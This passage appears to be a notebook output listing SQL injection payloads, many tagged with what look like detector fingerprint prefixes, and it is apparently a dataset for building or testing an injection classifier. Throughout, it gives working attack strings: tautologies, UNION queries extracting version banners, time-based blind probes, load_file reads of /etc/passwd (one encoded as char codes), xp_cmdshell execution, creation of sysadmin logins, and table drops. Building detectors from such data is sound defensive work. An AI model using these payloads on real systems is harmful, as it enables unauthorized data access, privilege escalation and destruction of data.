       " '@var select @var as var into temp end --',\n",
       " \"' and 1 in  ( select var from temp ) --\",\n",
       " \"' union select 1,load_file ( '/etc/passwd' ) ,1,1,1;\",\n",
       " '1; ( load_file ( char ( 47,101,116,99,47,112,97,115,115,119,100  )  )   ) ,1,1,1;',\n",
       " \"' and 1 =  (  if  (  (  load_file ( char ( 110,46,101,120,116  )  )  <>char ( 39,39  )  )  ,1,0  )  )  ;\",\n",
       " \"'; exec master..xp_cmdshell 'ping 10.10.1.2'--\",\n",
       " \"create user name identified by 'pass123'\",\n",
       " 'create user name identified by pass123 temporary tablespace temp default tablespace users; ',\n",
       " \"' ; drop table temp --\",\n",
       " \"exec sp_addlogin 'name' , 'password'\",\n",
       " \"exec sp_addsrvrolemember 'name' , 'sysadmin'\",\n",
       " \"insert into mysql.user  ( user, host, password )  values  ( 'name', 'localhost', password ( 'pass123'  )  )  \",\n",
       " 'grant connect to name; grant resource to name;',\n",
       " 'insert into users ( login, password, level )  values (  char ( 0x70 )  + char ( 0x65 )  + char ( 0x74 )  + char ( 0x65 )  + char ( 0x72 )  + char ( 0x70 )  + char ( 0x65 )  + char ( 0x74 )  + char ( 0x65 )  + char ( 0x72 ) ,char ( 0x64 ) ',\n",
       " \"' or 1 = 1 --\",\n",
       " \"' union  ( select @@version )  --\",\n",
       " \"' union  ( select NULL,  ( select @@version  )  )   --\",\n",
       " \"' union  ( select NULL, NULL,  ( select @@version  )  )   --\",\n",
       " \"' union  ( select NULL, NULL, NULL,   ( select @@version  )  )   --\",\n",
       " \"' union  ( select NULL, NULL, NULL, NULL,   ( select @@version  )  )   --\",\n",
       " \"' union  ( select NULL, NULL, NULL, NULL,  NULL,  ( select @@version  )  )   --\",\n",
       " \"'; if not ( substring  (  (  select @@version ) ,25,1 )  <> 0 )  waitfor delay '0:0:2' --\",\n",
       " \"'; if not ( substring  (  (  select @@version ) ,25,1 )  <> 5 )  waitfor delay '0:0:2' --\",\n",
       " \"'; if not ( substring  (  (  select @@version ) ,25,1 )  <> 8 )  waitfor delay '0:0:2' --\",\n",
       " \"'; if not ( substring  (  (  select @@version ) ,24,1 )  <> 1 )  waitfor delay '0:0:2' --\",\n",
       " \"'; if not ( select system_user )  <> 'sa' waitfor delay '0:0:2' --\",\n",
       " \"'; if is_srvrolemember ( 'sysadmin' )  > 0 waitfor delay '0:0:2' -- \",\n",
       " \"'; if not  (  (  select serverproperty ( 'isintegratedsecurityonly'  )  )   <> 1 )  waitfor delay '0:0:2' --\",\n",
       " \"'; if not  (  (  select serverproperty ( 'isintegratedsecurityonly'  )  )   <> 0 )  waitfor delay '0:0:2' --\",\n",
       " '& (  ) o1: select * from users where id = 1 or  ( \\\\ )  = 1 union select 1,@@VERSION -- 1',\n",
       " '& ( . ) o: select * from users where id = 1 or  ( \\\\. )  = 1 union select 1,@@VERSION -- 1',\n",
       " '& ( 1&1: select * from users where id = 1 or  ( \\\\+ )  = 1 or 1 = 1 -- 1',\n",
       " '& ( 1 ) o: select * from users where id = 1 or  ( 1 )  = 1 union select 1,banner from v$version where rownum = 1 -- 1',\n",
       " '& ( 1UE: select * from users where id = 1 or  ( \\\\+ )  = 1 union select 1,@@VERSION -- 1',\n",
       " '& ( n&1: select * from users where id = 1 or  ( $+ )  = 1 or 1 = 1 -- 1',\n",
       " '& ( nUE: select * from users where id = 1 or  ( $+ )  = 1 union select 1,@@VERSION -- 1',\n",
       " '&.o&1: select * from users where id = 1 or \\\\.<\\\\ or 1 = 1 -- 1',\n",
       " '&.o1&: select * from users where id = 1 or \\\\.<1 or 1 = 1 -- 1',\n",
       " '&.o1U: select * from users where id = 1 or \\\\.<1 union select 1,@@VERSION -- 1',\n",
       " '&.oUE: select * from users where id = 1 or \\\\.<\\\\ union select 1,@@VERSION -- 1',\n",
       " '&.on&: select * from users where id = 1 or \\\\.<$ or 1 = 1 -- 1',\n",
       " '&.onU: select * from users where id = 1 or \\\\.<$ union select 1,@@VERSION -- 1',\n",
       " '&.oo1: select * from users where id = 1 or \\\\.<  = 1 union select 1,@@VERSION -- 1',\n",
       " '&1UE1: select * from users where id = 1 ||1 union select 1,banner from v$version where rownum = 1 -- 1',\n",
       " '&1UEv: select * from users where id = 1 ||1 union select null,banner from v$version where rownum = 1 -- 1',\n",
       " '&1c: select * from users where id = 1   or 1 = 1 -- 1',\n",
       " '&1oo&: select * from users where id = 1 or \\\\+<\\\\ or 1 = 1 -- 1',\n",
       " '&1oo1: select * from users where id = 1 or  1<@ = 1 union select 1,version (  )  -- 1',\n",
       " '&1ooU: select * from users where id = 1 or \\\\+<\\\\ union select 1,@@VERSION -- 1',\n",
       " '&1oon: select * from users where id = 1 or \\\\+<$ union select 1,@@VERSION -- 1',\n",
       " '&1ovc: select * from users where id = 1 or 1&@# = 1 union select 1,version (  )  -- 1',\n",
       " '&n.o1: select * from users where id = 1 or $ . = 1 union select 1,@@VERSION -- 1',\n",
       " '&n1&1: select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1',\n",
       " '&n1UE: select * from users where id = 1 or $ 1 = 1 union select 1,@@VERSION -- 1',\n",
       " '&no&1: select * from users where id = 1 or $<\\\\ or 1 = 1 -- 1',\n",
       " '&no.&: select * from users where id = 1 or $<\\\\. or 1 = 1 -- 1',\n",
       " '&no.U: select * from users where id = 1 or $<\\\\. union select 1,@@VERSION -- 1',\n",
       " '&noUE: select * from users where id = 1 or $<\\\\ union select 1,@@VERSION -- 1',\n",
       " '&noo&: select * from users where id = 1 or $+<\\\\ or 1 = 1 -- 1',\n",
       " '&noo1: select * from users where id = 1 or $+<1 union select 1,@@VERSION -- 1',\n",
       " '&nooU: select * from users where id = 1 or $+<\\\\ union select 1,@@VERSION -- 1',\n",
       " '&noon: select * from users where id = 1 or $+<$ union select 1,@@VERSION -- 1',\n",
       " '&o.&1: select * from users where id = 1 or \\\\<\\\\. or 1 = 1 -- 1',\n",
       " '&o.UE: select * from users where id = 1 or \\\\<\\\\. union select 1,@@VERSION -- 1',\n",
       " '&o1&1: select * from users where id = 1 or \\\\<1 or 1 = 1 -- 1',\n",
       " '&o1UE: select * from users where id = 1 or \\\\<1 union select 1,@@VERSION -- 1',\n",
       " '&oUE1: select * from users where id = 1 or \\\\<\\\\ union select 1,@@VERSION -- 1',\n",
       " '&oUEv: select * from users where id = 1 or \\\\<\\\\ union select null,@@VERSION -- 1',\n",
       " '&on&1: select * from users where id = 1 or \\\\<$ or 1 = 1 -- 1',\n",
       " '&onUE: select * from users where id = 1 or \\\\<$ union select 1,@@VERSION -- 1',\n",
       " '&oo1&: select * from users where id = 1 or \\\\<  = 1 or 1 = 1 -- 1',\n",
       " '&oo1U: select * from users where id = 1 or \\\\<  = 1 union select 1,@@VERSION -- 1',\n",
       " '&ov&1: select * from users where id = 1 or !<@ or 1 = 1 -- 1',\n",
       " '&ovUE: select * from users where id = 1 or !<@ union select 1,version (  )  -- 1',\n",
       " '&v: select * from users where id = 1 or @`\\\\` union select 1,version (  )  -- 1',\n",
       " '&vc: select * from users where id = 1 or  @$# = 1 union select 1,version (  )  -- 1',\n",
       " '&voo1: select * from users where id = 1 or @<@ = 1 union select 1,version (  )  -- 1',\n",
       " ' ) &1c: select * from users where id = 1 + ( \\\\ )  or 1 = 1 -- 1',\n",
       " ' ) UEvc: select * from users where id = 1 + ( \\\\ )  union select null,@@VERSION -- 1',\n",
       " '.&1UE: select * from users where id = 1.&&1 union select 1,version (  )  -- 1',\n",
       " '.&1c: select * from users where id = 1. or 1 = 1 -- 1',\n",
       " '.&vUE: select * from users where id = 1.&&@ union select 1,version (  )  -- 1',\n",
       " '. ) &1c: select * from users where id = 1 +  ( \\\\. )  or 1 = 1 -- 1',\n",
       " '. ) UEv: select * from users where id = 1 +  ( \\\\. )  union select null,@@VERSION -- 1',\n",
       " '.UE1,: select * from users where id = 1.  union select 1,version (  )  -- 1',\n",
       " '.UE1k: select * from users where id = 1. union select 1,banner from v$version where rownum = 1 -- 1',\n",
       " '.UEf ( : select * from users where id = 1.  union select version (  ) ,version (  )  -- 1',\n",
       " '.UEv,: select * from users where id = 1. union select null,version (  )  -- 1',\n",
       " '.UEvc: select * from users where id = 1 +\\\\. union select null,@@VERSION -- 1',\n",
       " '.UEvk: select * from users where id = 1. union select null,banner from v$version where rownum = 1 -- 1',\n",
       " '.o&1c: select * from users where id = 1. <@ or 1 = 1 -- 1',\n",
       " '.o.&1: select * from users where id = 1.<@. or 1 = 1 -- 1',\n",
       " '.o.UE: select * from users where id = 1.<@. union select 1,version (  )  -- 1',\n",
       " '.o1&1: select * from users where id = 1.*1 or 1 = 1 -- 1',\n",
       " '.o1UE: select * from users where id = 1.*1 union select 1,banner from v$version where rownum = 1 -- 1',\n",
       " '.o1c: select * from users where id = 1.<1# union select 1,version (  )  -- 1',\n",
       " '.oUE1: select * from users where id = 1. <@ union select 1,version (  )  -- 1',\n",
       " '.oUEf: select * from users where id = 1. <@ union select version (  ) ,version (  )  -- 1',\n",
       " '.oUEv: select * from users where id = 1.*\\\\ union select null,@@VERSION -- 1',\n",
       " '.on&1: select * from users where id = 1.<@$ or 1 = 1 -- 1',\n",
       " '.onUE: select * from users where id = 1.<@$ union select 1,version (  )  -- 1',\n",
       " '.ov&1: select * from users where id = 1.%@ or 1 = 1 -- 1',\n",
       " '.ovUE: select * from users where id = 1.%@ union select 1,version (  )  -- 1',\n",
       " '1&1UE: select * from users where id = 11||1 union select 1,banner from v$version where rownum = 1 -- 1',\n",
       " '1&1c: select * from users where id = 1 +1 or 1 = 1 -- 1',\n",
       " '1 ) &1c: select * from users where id = 1 + ( 1 )  or 1 = 1 -- 1',\n",
       " '1 ) UE1: select * from users where id = 1 + ( 1 )  union select 1,banner from v$version where rownum = 1 -- 1',\n",
       " '1 ) UEv: select * from users where id = 1 + ( 1 )  union select null,banner from v$version where rownum = 1 -- 1',\n",
       " '1UE1k: select * from users where id = 1 +1 union select 1,banner from v$version where rownum = 1 -- 1',\n",
       " '1UEvk: select * from users where id = 1 +1 union select null,banner from v$version where rownum = 1 -- 1',\n",
       " '1c: select * from users where id = 11<1# union select 1,version (  )  -- 1',\n",
       " '1o ) &1: select * from users where id = 1 +  ( \\\\+ )  or 1 = 1 -- 1',\n",
       " '1o ) UE: select * from users where id = 1 +  ( \\\\+ )  union select null,@@VERSION -- 1',\n",
       " '1o.UE: select * from users where id = 1 +\\\\+. union select null,@@VERSION -- 1',\n",
       " '1oUE1: select * from users where id = 1 -1<@ union select 1,version (  )  -- 1',\n",
       " '1oUEf: select * from users where id = 1 +1<@ union select version (  ) ,version (  )  -- 1',\n",
       " '1oUEv: select * from users where id = 1 +1<@ union select null,version (  )  -- 1',\n",
       " '1oo&1: select * from users where id = 1 + \\\\+%\\\\ or 1 = 1 -- 1',\n",
       " '1oo1&: select * from users where id = 1 + \\\\+%1 or 1 = 1 -- 1',\n",
       " '1oo1U: select * from users where id = 1 + \\\\+%1 union select null,@@VERSION -- 1',\n",
       " '1ooUE: select * from users where id = 1 + \\\\+*\\\\ union select null,@@VERSION -- 1',\n",
       " '1oon&: select * from users where id = 1 + \\\\+%$ or 1 = 1 -- 1',\n",
       " '1oonU: select * from users where id = 1 + \\\\+*$ union select null,@@VERSION -- 1',\n",
       " 'UE ( 1 ) : select * from users where id = 1 union select  ( 1 ) ,banner from v$version where rownum = 1 -- 1',\n",
       " 'UE1&1: select * from users where id = 1 union select 1||1,version (  )  -- 1',\n",
       " 'UE1&v: select * from users where id = 1 union select 1||@,version (  )  -- 1',\n",
       " 'UE111: select * from users where id = 1 union select 1 1$,version (  )  -- 1',\n",
       " 'UE11f: select * from users where id = 1 union select 1 $,version (  )  -- 1',\n",
       " 'UE11n: select * from users where id = 1 union select 1 1a,version (  )  -- 1',\n",
       " 'UE1f ( : select * from users where id = 1 union select 1<@$,version (  )  -- 1',\n",
       " 'UE1kn: select * from users where id = 1 union select 1,banner from v$version where rownum = 1 -- 1',\n",
       " 'UE1n,: select * from users where id = 1 union select .1_,version (  )  -- 1',\n",
       " 'UE1n: select * from users where id = 1 union select 1`\\\\`,version (  )  -- 1',\n",
       " 'UE1nc: select * from users where id = 1 union select 1a#,banner from v$version where rownum = 1 -- 1',\n",
       " 'UE1nk: select * from users where id = 1 union select 1a,banner from v$version where rownum = 1 -- 1',\n",
       " 'UE1nn: select * from users where id = 1 union select .1$_,version (  )  -- 1',\n",
       " 'UE1o,: select * from users where id = 1 union select 1<@,version (  )  -- 1',\n",
       " 'UE1o.: select * from users where id = 1 union select 1<@.,version (  )  -- 1',\n",
       " 'UE1s: select * from users where id = 1 union select 1 $$,version (  )  -- 1',\n",
       " 'UEo1,: select * from users where id = 1 union select !<1,version (  )  -- 1',\n",
       " 'UEoo1: select * from users where id = 1 union select +!<1,version (  )  -- 1',\n",
       " 'UEoov: select * from users where id = 1 union select +!<@,version (  )  -- 1',\n",
       " 'UEov,: select * from users where id = 1 union select !<@,version (  )  -- 1',\n",
       " 'UEv&1: select * from users where id = 1 union select @||1,version (  )  -- 1',\n",
       " 'UEv&v: select * from users where id = 1 union select @&&@,version (  )  -- 1',\n",
       " 'UEv11: select * from users where id = 1 union select @ 1$,version (  )  -- 1',\n",
       " 'UEv1f: select * from users where id = 1 union select  @ $,version (  )  -- 1',\n",
       " 'UEv1n: select * from users where id = 1 union select @ 1a,version (  )  -- 1',\n",
       " 'UEvf ( : select * from users where id = 1 union select @<@$,version (  )  -- 1',\n",
       " 'UEvkn: select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1',\n",
       " 'UEvn,: select * from users where id = 1 union select @ _,version (  )  -- 1',\n",
       " 'UEvnn: select * from users where id = 1 union select @ $_,version (  )  -- 1',\n",
       " 'UEvo,: select * from users where id = 1 union select @<@,version (  )  -- 1',\n",
       " 'UEvo.: select * from users where id = 1 union select @<@.,version (  )  -- 1',\n",
       " 'UEvs: select * from users where id = 1 union select @ $$,version (  )  -- 1',\n",
       " 'n.&1c: select * from users where id = 1 +$ . or 1 = 1 -- 1',\n",
       " 'n.UEv: select * from users where id = 1 +$ . union select null,@@VERSION -- 1',\n",
       " 'n1&1c: select * from users where id = 1 +$ 1 or 1 = 1 -- 1',\n",
       " 'n1UEv: select * from users where id = 1 +$ 1 union select null,@@VERSION -- 1',\n",
       " 'no&1c: select * from users where id = 1 +$+ or 1 = 1 -- 1',\n",
       " 'no ) &1: select * from users where id = 1 +  ( $+ )  or 1 = 1 -- 1',\n",
       " 'no ) UE: select * from users where id = 1 +  ( $+ )  union select null,@@VERSION -- 1',\n",
       " 'no.&1: select * from users where id = 1 +$+. or 1 = 1 -- 1',\n",
       " 'no.UE: select * from users where id = 1 +$+. union select null,@@VERSION -- 1',\n",
       " 'noUEv: select * from users where id = 1 +$+ union select null,@@VERSION -- 1',\n",
       " 'noo&1: select * from users where id = 1 + $+%\\\\ or 1 = 1 -- 1',\n",
       " 'noo1&: select * from users where id = 1 + $+%1 or 1 = 1 -- 1',\n",
       " 'noo1U: select * from users where id = 1 + $+%1 union select null,@@VERSION -- 1',\n",
       " 'nooUE: select * from users where id = 1 + $+*\\\\ union select null,@@VERSION -- 1',\n",
       " 'noon&: select * from users where id = 1 + $+%$ or 1 = 1 -- 1',\n",
       " 'noonU: select * from users where id = 1 + $+*$ union select null,@@VERSION -- 1',\n",
       " 'o&1c: select * from users where id = 1 <@ or 1 = 1 -- 1',\n",
       " 'o (  ) &1: select * from users where id = 1 % ( \\\\ )  or 1 = 1 -- 1',\n",
       " 'o (  ) UE: select * from users where id = 1 * ( \\\\ )  union select null,@@VERSION -- 1',\n",
       " 'o ( 1 ) &: select * from users where id = 1 % ( 1 )  or 1 = 1 -- 1',\n",
       " 'o ( 1 ) U: select * from users where id = 1 * ( 1 )  union select 1,banner from v$version where rownum = 1 -- 1',\n",
       " 'o ( n ) &: select * from users where id = 1 % ( $ )  or 1 = 1 -- 1',\n",
       " 'o ( v ) &: select * from users where id = 1 % ( @ )  or 1 = 1 -- 1',\n",
       " 'o.&1c: select * from users where id = 1 <@. or 1 = 1 -- 1',\n",
       " 'o..&1: select * from users where id = 1 <@.. or 1 = 1 -- 1',\n",
       " 'o..UE: select * from users where id = 1<@.. union select 1,version (  )  -- 1',\n",
       " 'o.UE1: select * from users where id = 1 <@. union select 1,version (  )  -- 1',\n",
       " 'o.UEf: select * from users where id = 1  <@. union select version (  ) ,version (  )  -- 1',\n",
       " 'o.UEv: select * from users where id = 1 *\\\\. union select null,@@VERSION -- 1',\n",
       " 'o.n&1: select * from users where id = 1 <@.$ or 1 = 1 -- 1',\n",
       " 'o.nUE: select * from users where id = 1 <@.$ union select 1,version (  )  -- 1',\n",
       " 'o1&1c: select * from users where id = 1 *1 or 1 = 1 -- 1',\n",
       " 'o1UE1: select * from users where id = 1 *1 union select 1,banner from v$version where rownum = 1 -- 1',\n",
       " 'o1UEv: select * from users where id = 1 *1 union select null,banner from v$version where rownum = 1 -- 1',\n",
       " 'o1c: select * from users where id = 1 <1## union select 1,version (  )  -- 1',\n",
       " 'o1n&1: select * from users where id = 1 <@1$ or 1 = 1 -- 1',\n",
       " 'o1nUE: select * from users where id = 1 <@1$ union select 1,version (  )  -- 1',\n",
       " 'oUEvc: select * from users where id = 1 *\\\\ union select null,@@VERSION -- 1',\n",
       " 'on&1c: select * from users where id = 1 <@$ or 1 = 1 -- 1',\n",
       " 'on.&1: select * from users where id = 1 %$ . or 1 = 1 -- 1',\n",
       " 'on.UE: select * from users where id = 1 *$ . union select null,@@VERSION -- 1',\n",
       " 'on1&1: select * from users where id = 1 %$ 1 or 1 = 1 -- 1',\n",
       " 'on1UE: select * from users where id = 1 %$ 1 union select null,@@VERSION -- 1',\n",
       " 'onn&1: select * from users where id = 1 <@$_ or 1 = 1 -- 1',\n",
       " 'onnUE: select * from users where id = 1 <@$_ union select 1,version (  )  -- 1',\n",
       " 'oo&1c: select * from users where id = 1 <@<@ or 1 = 1 -- 1',\n",
       " 'oo1&1: select * from users where id = 1 %!<1 or 1 = 1 -- 1',\n",
       " 'oo1UE: select * from users where id = 1 | |1 union select 1,banner from v$version where rownum = 1 -- 1',\n",
       " 'ooUE1: select * from users where id = 1<@<@ union select 1,version (  )  -- 1',\n",
       " 'ooUEf: select * from users where id = 1 <@<@ union select version (  ) ,version (  )  -- 1',\n",
       " 'ooUEv: select * from users where id = 1 <@<@ union select null,version (  )  -- 1',\n",
       " 'oov&1: select * from users where id = 1 %!<@ or 1 = 1 -- 1',\n",
       " 'oovUE: select * from users where id = 1 <@&@ union select 1,version (  )  -- 1',\n",
       " 'os: select * from users where id = 1 <@$$ union select 1,version (  )  -- 1',\n",
       " 'ov&1c: select * from users where id = 1 &@ or 1 = 1 -- 1',\n",
       " \"s&&o1: select * from users where id = '1' or ||/1 = 1 union select 1,version (  )  -- 1'\",\n",
       " \"s& (  ) o: select * from users where id = '1' or  ( \\\\ )  = 1 union select 1,@@VERSION -- 1'\",\n",
       " \"s& ( . ) : select * from users where id = '1' or  ( \\\\. )  = 1 union select 1,@@VERSION -- 1'\",\n",
       " \"s& ( 1 ) : select * from users where id = '1' or  ( 1 )  = 1 union select 1,banner from v$version where rownum = 1 -- 1'\",\n",
       " \"s&.o&: select * from users where id = '1' or \\\\.<\\\\ or 1 = 1 -- 1'\",\n",
       " \"s&.o1: select * from users where id = '1' or \\\\.<1 union select 1,@@VERSION -- 1'\",\n",
       " \"s&.oU: select * from users where id = '1' or \\\\.<\\\\ union select 1,@@VERSION -- 1'\",\n",
       " \"s&.on: select * from users where id = '1' or \\\\.<$ union select 1,@@VERSION -- 1'\",\n",
       " \"s&.oo: select * from users where id = '1' or \\\\.<  = 1 union select 1,@@VERSION -- 1'\",\n",
       " \"s&1UE: select * from users where id = '1' ||1 union select 1,banner from v$version where rownum = 1 -- 1'\",\n",
       " \"s&1c: select * from users where id = '1'   or 1 = 1 -- 1'\",\n",
       " \"s&1oo: select * from users where id = '1' or 1^ = 1 union select 1,banner from v$version where rownum = 1 -- 1'\",\n",
       " \"s&n.o: select * from users where id = '1' or $ . = 1 union select 1,@@VERSION -- 1'\",\n",
       " \"s&n1&: select * from users where id = '1' or $ 1 = 1 or 1 = 1 -- 1'\",\n",
       " \"s&n1U: select * from users where id = '1' or $ 1 = 1 union select 1,@@VERSION -- 1'\",\n",
       " \"s&no&: select * from users where id = '1' or $<\\\\ or 1 = 1 -- 1'\",\n",
       " \"s&no.: select * from users where id = '1' or $<\\\\. union select 1,@@VERSION -- 1'\",\n",
       " \"s&noU: select * from users where id = '1' or $<\\\\ union select 1,@@VERSION -- 1'\",\n",
       " \"s&noo: select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'\",\n",
       " \"s&o.&: select * from users where id = '1' or \\\\<\\\\. or 1 = 1 -- 1'\",\n",
       " \"s&o.U: select * from users where id = '1' or \\\\<\\\\. union select 1,@@VERSION -- 1'\",\n",
       " \"s&o1&: select * from users where id = '1' or \\\\<1 or 1 = 1 -- 1'\",\n",
       " \"s&o1U: select * from users where id = '1' or !<1 union select 1,version (  )  -- 1'\",\n",
       " \"s&oUE: select * from users where id = '1' or \\\\<\\\\ union select 1,@@VERSION -- 1'\",\n",
       " \"s&on&: select * from users where id = '1' or \\\\<$ or 1 = 1 -- 1'\",\n",
       " \"s&onU: select * from users where id = '1' or \\\\<$ union select 1,@@VERSION -- 1'\",\n",
       " \"s&oo1: select * from users where id = '1' or \\\\<  = 1 union select 1,@@VERSION -- 1'\",\n",
       " \"s&ov&: select * from users where id = '1' or !<@ or 1 = 1 -- 1'\",\n",
       " \"s&ovU: select * from users where id = '1' or !<@ union select 1,version (  )  -- 1'\",\n",
       " \"s&v ( 1: select * from users where id = '1' or @ ( 1 )  = 1 union select 1,version (  )  -- 1'\",\n",
       " \"s&v1U: select * from users where id = '1' or @ 1 = 1 union select 1,version (  )  -- 1'\",\n",
       " \"s&vvU: select * from users where id = '1' or @ @1 = 1 union select 1,version (  )  -- 1'\",\n",
       " 's (  ) s: select * from users where id = 1 or \" (  ) \" or 1 = 1 -- 1',\n",
       " 's ( ,s: select * from users where id = 1 or \" ( ,\" = 1 or 1 = 1 -- 1',\n",
       " 's ( .s: select * from users where id = 1 or \" ( .\" or 1 = 1 -- 1',\n",
       " 's ( 1s: select * from users where id = 1 or \" ( 1\" or 1 = 1 -- 1',\n",
       " 's ( :s: select * from users where id = 1 or \" ( :\" or 1 = 1 -- 1',\n",
       " 's ( ;s: select * from users where id = 1 or \" ( ;\" or 1 = 1 -- 1',\n",
       " 's ( ?s: select * from users where id = 1 or \" ( ]\" or 1 = 1 -- 1',\n",
       " 's ( UE1: select * from users where id = 1 or 1#\" (  union select 1,version (  )  -- 1',\n",
       " 's ( UEf: select * from users where id = 1 or 1#\" (  union select version (  ) ,version (  )  -- 1',\n",
       " 's ( UEs: select * from users where id = 1 or 1#\" (  union select \\'a\\',version (  )  -- 1',\n",
       " 's ( UEv: select * from users where id = 1 or 1#\" (  union select null,version (  )  -- 1',\n",
       " 's ( c: select * from users where id = 1 or \" ( #\" or 1 = 1 -- 1',\n",
       " 's ( n: select * from users where id = 1 or \" ( [\" or 1 = 1 -- 1',\n",
       " 's ( ns: select * from users where id = 1 or \" ( _\" or 1 = 1 -- 1',\n",
       " 's ( o1&: select * from users where id = 1 or @#\" (  = 1 or 1 = 1 -- 1',\n",
       " 's ( o1U: select * from users where id = 1 or @#\" (  = 1 union select 1,version (  )  -- 1',\n",
       " 's ( os: select * from users where id = 1 or \" ( &\" or 1 = 1 -- 1',\n",
       " 's ( v: select * from users where id = 1 or \" ( @\" or 1 = 1 -- 1',\n",
       " 's ( {s: select * from users where id = 1 or \" ( {\" or 1 = 1 -- 1',\n",
       " 's )  ( s: select * from users where id = 1 or \" )  ( \" = 1 or 1 = 1 -- 1',\n",
       " 's ) ,s: select * from users where id = 1 or \" ) ,\" or 1 = 1 -- 1',\n",
       " 's ) .s: select * from users where id = 1 or \" ) .\" = 1 or 1 = 1 -- 1',\n",
       " 's ) 1s: select * from users where id = 1 or \" ) 1\" or 1 = 1 -- 1',\n",
       " 's ) :s: select * from users where id = 1 or \" ) :\" or 1 = 1 -- 1',\n",
       " 's ) ;s: select * from users where id = 1 or \" ) ;\" or 1 = 1 -- 1',\n",
       " 's ) ?s: select * from users where id = 1 or \" ) ]\" or 1 = 1 -- 1',\n",
       " 's ) n: select * from users where id = 1 or \" ) [\" or 1 = 1 -- 1',\n",
       " 's ) ns: select * from users where id = 1 or \" ) $\" or 1 = 1 -- 1',\n",
       " 's ) v: select * from users where id = 1 or \" ) @\" or 1 = 1 -- 1',\n",
       " 's ) {s: select * from users where id = 1 or \" ) {\" or 1 = 1 -- 1',\n",
       " 's, ( s: select * from users where id = 1 or \", ( \" or 1 = 1 -- 1',\n",
       " 's, ) s: select * from users where id = 1 or \", ) \" = 1 or 1 = 1 -- 1',\n",
       " 's,,s: select * from users where id = 1 or \",,\" = 1 or 1 = 1 -- 1',\n",
       " 's,.s: select * from users where id = 1 or \",.\" or 1 = 1 -- 1',\n",
       " 's,:s: select * from users where id = 1 or \",:\" = 1 or 1 = 1 -- 1',\n",
       " 's,;s: select * from users where id = 1 or \",;\" or 1 = 1 -- 1',\n",
       " 's,?s: select * from users where id = 1 or \",?\" or 1 = 1 -- 1',\n",
       " 's,UE1: select * from users where id = 1 or 1#\", union select 1,version (  )  -- 1',\n",
       " 's,UEf: select * from users where id = 1 or 1#\", union select version (  ) ,version (  )  -- 1',\n",
       " 's,UEs: select * from users where id = 1 or 1#\", union select \\'a\\',version (  )  -- 1',\n",
       " 's,UEv: select * from users where id = 1 or 1#\", union select null,version (  )  -- 1',\n",
       " 's,c: select * from users where id = 1 or \",#\" or 1 = 1 -- 1',\n",
       " 's,o1&: select * from users where id = 1 or 1#\", = 1 or 1 = 1 -- 1',\n",
       " 's,o1U: select * from users where id = 1 or @#\", = 1 union select 1,version (  )  -- 1',\n",
       " 's,os: select * from users where id = 1 or \",&\" or 1 = 1 -- 1',\n",
       " 's,{s: select * from users where id = 1 or \",{\" or 1 = 1 -- 1',\n",
       " 's. ( s: select * from users where id = 1 or \". ( \" or 1 = 1 -- 1',\n",
       " 's. ) s: select * from users where id = 1 or \". ) \" or 1 = 1 -- 1',\n",
       " 's.,s: select * from users where id = 1 or \".,\" or 1 = 1 -- 1',\n",
       " 's..s: select * from users where id = 1 or \"..\" = 1 or 1 = 1 -- 1',\n",
       " 's.:s: select * from users where id = 1 or \".:\" = 1 or 1 = 1 -- 1',\n",
       " 's.;s: select * from users where id = 1 or \".;\" or 1 = 1 -- 1',\n",
       " 's.?s: select * from users where id = 1 or \".]\" or 1 = 1 -- 1',\n",
       " 's.UE1: select * from users where id = 1 or 1#\". union select 1,version (  )  -- 1',\n",
       " 's.UEf: select * from users where id = 1 or 1#\". union select version (  ) ,version (  )  -- 1',\n",
       " 's.UEs: select * from users where id = 1 or 1#\". union select \\'a\\',version (  )  -- 1',\n",
       " 's.UEv: select * from users where id = 1 or 1#\". union select null,version (  )  -- 1',\n",
       " 's.c: select * from users where id = 1 or \".#\" or 1 = 1 -- 1',\n",
       " 's.n: select * from users where id = 1 or \".[\" or 1 = 1 -- 1',\n",
       " 's.ns: select * from users where id = 1 or \"._\" or 1 = 1 -- 1',\n",
       " 's.o1&: select * from users where id = 1 or @#\". = 1 or 1 = 1 -- 1',\n",
       " 's.o1U: select * from users where id = 1 or 1#\". = 1 union select 1,version (  )  -- 1',\n",
       " 's.os: select * from users where id = 1 or \".%\" or 1 = 1 -- 1',\n",
       " 's.v: select * from users where id = 1 or \".@\" or 1 = 1 -- 1',\n",
       " 's.{s: select * from users where id = 1 or \".{\" or 1 = 1 -- 1',\n",
       " 's1 ( s: select * from users where id = 1 or \"1 ( \" = 1 or 1 = 1 -- 1',\n",
       " 's1 ) s: select * from users where id = 1 or \"1 ) \" or 1 = 1 -- 1',\n",
       " 's1: select * from users where id = 1 or \"1,\" or 1 = 1 -- 1',\n",
       " 's1:s: select * from users where id = 1 or \"1:\" or 1 = 1 -- 1',\n",
       " 's1;s: select * from users where id = 1 or \"1;\" = 1 or 1 = 1 -- 1',\n",
       " 's1?s: select * from users where id = 1 or \"1]\" or 1 = 1 -- 1',\n",
       " 's1UE1: select * from users where id = 1 or 1#\"1 union select 1,version (  )  -- 1',\n",
       " 's1UEf: select * from users where id = 1 or 1#\"1 union select version (  ) ,version (  )  -- 1',\n",
       " 's1UEs: select * from users where id = 1 or 1#\"1 union select \\'a\\',version (  )  -- 1',\n",
       " 's1UEv: select * from users where id = 1 or 1#\"1 union select null,version (  )  -- 1',\n",
       " 's1c: select * from users where id = 1 or \"1#\" or 1 = 1 -- 1',\n",
       " 's1n: select * from users where id = 1 or \"1[\" or 1 = 1 -- 1',\n",
       " 's1ns: select * from users where id = 1 or \"1_\" or 1 = 1 -- 1',\n",
       " 's1os: select * from users where id = 1 or \"1&\" or 1 = 1 -- 1',\n",
       " 's1{s: select * from users where id = 1 or \"1{\" or 1 = 1 -- 1',\n",
       " 's: select * from users where id = \\'1\\' or \"\"<@ union select 1,version (  )  -- 1\\'',\n",
       " 's:&1c: select * from users where id = 1 or 1#\": or 1 = 1 -- 1',\n",
       " 's: ( s: select * from users where id = 1 or \": ( \" = 1 or 1 = 1 -- 1',\n",
       " 's: ) s: select * from users where id = 1 or \": ) \" = 1 or 1 = 1 -- 1',\n",
       " 's:,s: select * from users where id = 1 or \":,\" or 1 = 1 -- 1',\n",
       " 's:.s: select * from users where id = 1 or \":.\" = 1 or 1 = 1 -- 1',\n",
       " 's:1s: select * from users where id = 1 or \":1\" or 1 = 1 -- 1',\n",
       " 's:;s: select * from users where id = 1 or \":;\" = 1 or 1 = 1 -- 1',\n",
